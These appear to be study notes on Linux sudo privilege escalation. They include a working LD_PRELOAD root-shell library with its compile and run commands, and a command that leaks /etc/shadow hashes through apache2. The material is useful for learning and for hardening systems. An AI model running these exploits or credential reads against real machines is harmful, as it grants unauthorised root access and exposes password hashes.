# 🛡️ Privilege Escalation: Sudo Misconfigurations — Notes

## 🔹 1. What is `sudo`?

`sudo` allows a normal user to run **specific commands** with **root privileges**.

Admins often allow limited sudo commands (e.g. `nmap`, `less`, `find`) without giving full root access.

To check your sudo privileges:

```bash
sudo -l
```

This lists all commands you can execute with elevated privileges.

---

## 🔹 2. GTFOBins for Sudo Exploits

**Website:**
👉 [https://gtfobins.github.io/#sudo](https://gtfobins.github.io/#sudo)

GTFOBins lists binaries that become exploitable when run with sudo.

### How to use:

1. Run:

   ```bash
   sudo -l
   ```

2. Note the allowed binaries.

3. Search each binary on GTFOBins.

4. If a **sudo escape** exists → you can get **root**.

Common sudo-exploitable binaries:

* `find`
* `vim` / `less`
* `python`
* `perl`
* `tar`
* `nmap`

---

## 🔹 3. Technique: Application Function Abuse

Some sudo-allowed programs don’t give an automatic shell but can leak sensitive data.

### 📌 Example: Apache2

Apache2 has a `-f` option:

```
-f <config-file>
```

If you run:

```bash
sudo apache2 -f /etc/shadow
```

Apache tries to read `/etc/shadow`, fails, and prints an error that **leaks the file content**.

This gives:

* password hashes
* root hash
* user accounts

Useful for cracking passwords.

---

## 🔹 4. Technique: LD_PRELOAD Privilege Escalation

### 4.1 What is `LD_PRELOAD`?

`LD_PRELOAD` forces a program to load **your custom shared library** before system libraries.

If sudo is misconfigured to **preserve this variable**, an attacker can inject root-level code.

Check with:

```bash
sudo -l
```

Look for:

```
env_keep+=LD_PRELOAD
```

If present → **machine is vulnerable**.

---

## 🔹 4.2 Requirements

To exploit LD_PRELOAD, you need:

* sudo permission on any binary (e.g. `find`, `ls`, `nano`)
* `env_keep+=LD_PRELOAD` in sudoers
* ability to create files (.so library)

---

## 🔹 4.3 Exploit Steps

### ✔ Step 1 — Confirm the misconfig

```bash
sudo -l
```

Check if:

```
env_keep+=LD_PRELOAD
```

exists.

---

### ✔ Step 2 — Create malicious shared library

Create `shell.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

This executes **before** the target program starts and spawns a root shell.

---

### ✔ Step 3 — Compile into `.so`

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Flags meaning:

* `-fPIC` → position-independent code
* `-shared` → produces a `.so` file
* `-nostartfiles` → allow `_init()` to run immediately

---

### ✔ Step 4 — Use sudo with LD_PRELOAD

Example using `find`:

```bash
sudo LD_PRELOAD=/home/user/shell.so find
```

OR depending on allowed commands:

```bash
sudo LD_PRELOAD=./shell.so ls
sudo LD_PRELOAD=./shell.so nano
sudo LD_PRELOAD=./shell.so apache2
```

---

### ✔ Result

You instantly get:

```
root#
```

This is one of the **strongest sudo privilege escalation methods.**

---

## 🔹 5. Summary Table

| Method         | Description                           | Needs Sudo?            | Result              |
| -------------- | ------------------------------------- | ---------------------- | ------------------- |
| **GTFOBins**   | Exploit allowed binaries with sudo    | ✔️ Yes                 | Root shell          |
| **Apache2 -f** | Use config load to leak `/etc/shadow` | ✔️ Yes                 | Info leak           |
| **LD_PRELOAD** | Inject malicious .so into sudo binary | ✔️ Yes (with env_keep) | **Full root shell** |

---

## 🔹 6. Key Takeaways

* Always begin PrivEsc with:

  ```bash
  sudo -l
  ```

* Any unusual allowed binary = potential root.

* GTFOBins gives straightforward sudo shell escapes.

* `LD_PRELOAD` misconfig = **instant root**.

* Even safe-looking binaries (e.g., `find`, `less`, `apache2`) can escalate privilege.

